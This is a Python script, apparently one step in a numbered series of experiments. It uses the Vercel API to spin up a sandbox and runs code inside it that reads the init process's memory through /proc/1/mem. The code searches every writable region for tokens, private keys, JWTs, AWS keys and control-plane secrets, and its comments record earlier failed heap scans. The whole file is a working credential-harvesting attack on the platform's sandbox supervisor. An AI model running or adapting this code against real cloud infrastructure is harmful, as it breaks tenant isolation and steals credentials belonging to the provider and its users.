# 实验J189: 动态解析maps全扫sandbox-init内存(arena+栈+小rw区)
# j188: heap 34MB无凭据(硬编码地址); arena 0字节(ASLR地址失效)
# 本步: 动态解析/proc/1/maps, 扫所有 rw 段(除已扫heap), 搜凭据+控制面数据
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=280):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(4):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        if c == 410 or "sandbox_stopped" in r:
            print(f"  SANDBOX_DEAD at cmd[{label}]", flush=True)
            return "DEAD"
        time.sleep(3)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return "DEAD" if "sandbox_stopped" in r else ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return ""

def bashfile(sid, cmd, label, n=10000):
    c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}",
               {"command": "bash", "args": ["-c", cmd], "wait": True, "logs": True, "timeout": 100})
    print(f"=== {label} status {c} ===", flush=True)
    print(r[:n], flush=True)
    return c

NAME = "expj189"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME})
print("create:", c)
if c != 200:
    print(r[:400])
    sys.exit(1)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid)

# PA: 动态maps解析 + 全rw段扫描
PA = r'''
import os
out = open("/tmp/d189a.txt", "w")
def p(*a):
    out.write(" ".join(str(x) for x in a) + "\n")
    out.flush()
p("start")
with open("/proc/1/maps") as fh:
    maps = fh.read()
segs = []
for ln in maps.splitlines():
    parts = ln.split()
    if len(parts) < 2:
        continue
    a, b = parts[0].split("-")
    name = parts[5] if len(parts) > 5 else ""
    segs.append((int(a, 16), int(b, 16), parts[1], name))
p("nsegs", len(segs))
for a, b, perm, name in segs:
    p("SEG", hex(a), hex(b), perm, name[:60])
p("---")
fd = os.open("/proc/1/mem", os.O_RDONLY)
pats = [b"vcp_", b"BEGIN PRIVATE KEY", b"BEGIN RSA", b"-----BEGIN", b"eyJhbGci",
        b"eyJ0eXAi", b"sk-", b"AKIA", b"x-vercel-", b"Authorization", b"WVN8gckg",
        b"api.vercel", b"vercel.com", b"signature", b"nonce", b"ed25519", b"secret",
        b"token", b"jsew6QlLu0BjbIS5zTym"]
total = 0
for a, b, perm, name in segs:
    if perm[0] != "r" or "w" not in perm:
        continue
    if name.startswith("["):
        continue
    if a >= 0x7f0000000000:  # 只扫用户地址
        pass
    # 跳过超大段(>256MB) 和 text/rodata(只读)
    if b - a > 256 * 1024 * 1024:
        p("SKIP_BIG", hex(a), hex(b), name[:40])
        continue
    p("SCAN", hex(a), hex(b), perm, name[:50])
    pos = a
    while pos < b:
        try:
            os.lseek(fd, pos, 0)
            d = os.read(fd, 8192)
        except Exception as ex:
            p("READ_EXC", hex(pos), repr(ex)[:80])
            break
        if not d:
            break
        total += len(d)
        for pat in pats:
            idx = d.find(pat)
            if idx >= 0:
                ctx = d[max(0, idx - 30):idx + 130]
                p("HIT", pat.decode(), hex(pos + idx),
                  ctx.replace(b"\x00", b".").replace(b"\n", b" ")[:170])
        pos += len(d)
    out.flush()
p("scanned", total)
os.close(fd)
p("done")
out.close()
'''

# PB: 栈区+线程栈 精细扫描(全部小rw区含[stack]标记外的匿名)
PB = r'''
import os
out = open("/tmp/d189b.txt", "w")
def p(*a):
    out.write(" ".join(str(x) for x in a) + "\n")
    out.flush()
p("start")
with open("/proc/1/maps") as fh:
    maps = fh.read()
fd = os.open("/proc/1/mem", os.O_RDONLY)
pats = [b"vcp_", b"BEGIN", b"eyJ", b"sk-", b"AKIA", b"vercel", b"token", b"secret",
        b"auth", b"bearer", b"jsew6QlLu0BjbIS5zTym", b"WVN8gckg", b"sign", b"key"]
total = 0
for ln in maps.splitlines():
    parts = ln.split()
    if len(parts) < 2:
        continue
    a, b = parts[0].split("-")
    a, b = int(a, 16), int(b, 16)
    perm = parts[1]
    name = parts[5] if len(parts) > 5 else ""
    if perm[0] != "r" or "w" not in perm:
        continue
    if b - a > 8 * 1024 * 1024:
        continue
    if name.startswith("[vvar") or name.startswith("[vdso") or name == "[vsyscall]":
        continue
    p("SCAN", hex(a), hex(b), perm, name[:50])
    pos = a
    while pos < b:
        try:
            os.lseek(fd, pos, 0)
            d = os.read(fd, 4096)
        except Exception:
            break
        if not d:
            break
        total += len(d)
        for pat in pats:
            idx = d.find(pat)
            if idx >= 0:
                ctx = d[max(0, idx - 40):idx + 140]
                p("HIT", pat.decode(), hex(pos + idx),
                  ctx.replace(b"\x00", b".").replace(b"\n", b" ")[:180])
        pos += len(d)
    out.flush()
p("scanned_small", total)
os.close(fd)
p("done")
out.close()
'''

steps = [
    ("all-rw", "/tmp/d189a.txt", PA),
    ("small-rw", "/tmp/d189b.txt", PB),
]
for label, marker, code in steps:
    st = run_cmd(sid, code, label, timeout=280)
    time.sleep(2)
    bashfile(sid, f"cat {marker}", f"marker[{label}]", 10000)
    if st == "DEAD":
        print(f"\n!!! DEATH after cmd[{label}]", flush=True)
        break

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
